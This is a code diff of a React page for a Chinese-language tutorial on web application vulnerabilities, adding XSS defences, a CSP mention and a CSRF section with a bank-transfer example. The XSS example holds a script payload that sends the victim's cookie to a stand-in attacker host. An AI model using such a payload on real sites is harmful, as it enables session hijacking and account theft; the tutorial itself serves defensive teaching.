@@ -3,22 +3,33 @@ import { Anchor } from 'antd';
 import { UseMarkDown } from '@/hooks/useMarkdown';
 import { LazyImage } from '@/component/image';
 import RISK from '@images/knowledge/risks.png';
-import { SQL_1, CODE_1, XSS_HTML } from './_safety';
-import BackTop from '@/component/backTop';
+import { SQL_1, CODE_1, XSS_HTML, CSP_CONFIG, CSRF_IMG } from './_safety';
 
 const { Link } = Anchor;
 
 export default function Index() {
   const sql_1 = <UseMarkDown markdown={SQL_1}></UseMarkDown>,
     code_1 = <UseMarkDown markdown={CODE_1}></UseMarkDown>,
-    xssHtml = <UseMarkDown markdown={XSS_HTML}></UseMarkDown>;
+    xssHtml = <UseMarkDown markdown={XSS_HTML}></UseMarkDown>,
+    cspConfig = <UseMarkDown markdown={CSP_CONFIG}></UseMarkDown>,
+    csrfImg = <UseMarkDown markdown={CSRF_IMG}></UseMarkDown>;
 
   return (
     <article id="rootActicle" className={classMap.article}>
-      <main id='main' className={classMap.content}>
+      <main id="main" className={classMap.content}>
         <h2 id="pre" className={classMap.articleTitle}>
           常见Web应用安全漏洞及应对手段
         </h2>
+        本文参考如下页面：
+        <a
+          className={classMap.href}
+          target="_blank"
+          rel="noreferrer"
+          href="https://cheatsheetseries.owasp.org/index.html"
+        >
+          OWASP
+        </a>
+        <br />
         攻击者可能有很多不同的路径来突破你的应用来搞破坏，路径图如下：
         <LazyImage src={RISK}></LazyImage>
         <br />
@@ -216,9 +227,58 @@ export default function Index() {
           <li>
             在HTML片段内没有经过校验或转义使用未信任的数据：
             {xssHtml}
+            攻击者把&quot;cc&quot;改为如下参数
+            <code>{`'><script>document.location='http://www.attacker.com/xxx/cookie?foo='+document.cookie'</script>'`}</code>
+            <br />
+            这样就造成了会话的sessionId被发送到攻击者的网站，攻击者成功劫持了用户的session。
           </li>
         </ul>
-        <BackTop />
+        <h3 id="prevent5" className={classMap.articleSubTitle}>
+          防御
+        </h3>
+        防止XSS需要将活跃内容和未信任的数据分开，措施如下：
+        <ul className={classMap.ul}>
+          <li>
+            1. 使用自动转义XSS设计的框架，例如<strong>React/Vue</strong>
+            等，学习框架的XSS保护措施，正确的处理没有覆盖到的场合。
+          </li>
+          <li>
+            2. 转义来自HTML输出的未信任的HTTP数据，例如(body,attribute,JavaScript,CSS,URL)可以解决反射型和存储型XSS。
+          </li>
+          <li>
+            3. 使用<code>Content Secruity Policy(CSP)</code>，它可以防止指定域名之外的恶意脚本执行。
+            {cspConfig}
+          </li>
+        </ul>
+        <h2 id="csrf" className={classMap.articleTitle}>
+          跨站请求伪造
+        </h2>
+        <h3 id="weakness6" className={classMap.articleSubTitle}>
+          漏洞
+        </h3>
+        <code>Cross-site request forgery(CSRF)</code>
+        是一种欺骗用户浏览器访问自己曾认证过的网站并执行一些恶意操作，被访问的网站会认为是真正的用户去执行，利用的是简单身份认证的漏洞。
+        <h3 id="example6" className={classMap.articleSubTitle}>
+          案例
+        </h3>
+        假定如下是某银行转账操作的URL：
+        <code>https://bank.example.com/withdraw?account=AccoutName&amount=1000&for=PayeeName</code>
+        <br />
+        攻击者在另一个网站放如下代码：
+        {csrfImg}
+        如果Alice访问了恶意站点，她访问银行的会话还未失效，那么就损失了1000。这种恶意网址形式多样，也不需要控制防止恶意网址的网站，可以藏在任何包括用户输出的网站中。
+        <h3 id="prevent6" className={classMap.articleSubTitle}>
+          防御手段
+        </h3>
+        攻击者不能获取用户账户控制权，也不能窃取信息，能做到的就是以用户的名义进行某些操作。所以有如下防御措施：
+        <ul className={classMap.ul}>
+          <li>
+            1. 检查<code>Referer</code>字段，这个方法简单，简单校验请求和Referer是否同一域名即可，但是它有局限性，无法保证没有其他漏洞影响它或者被篡改。
+          </li>
+          <li>
+            2. 添加校验Token，由服务器在某个请求中下发，然后在用户请求的时候一并提交校验，CSRF攻击并不能提前获取到这个随机数的值，校验Token错误就拒绝该请求。
+          </li>
+        </ul>
         <Anchor className="anchor" getContainer={() => document.getElementById('content') as HTMLElement}>
           <Link href="#injection" title="注入">
             <Link href="#weakness1" title="漏洞"></Link>
@@ -244,6 +304,11 @@ export default function Index() {
             <Link href="#weakness5" title="漏洞"></Link>
             <Link href="#example5" title="案例"></Link>
             <Link href="#prevent5" title="防御手段"></Link>
+          </Link>
+          <Link href="#csrf" title="跨站请求伪造">
+            <Link href="#weakness6" title="漏洞"></Link>
+            <Link href="#example6" title="案例"></Link>
+            <Link href="#prevent6" title="防御手段"></Link>
           </Link>
         </Anchor>
       </main>
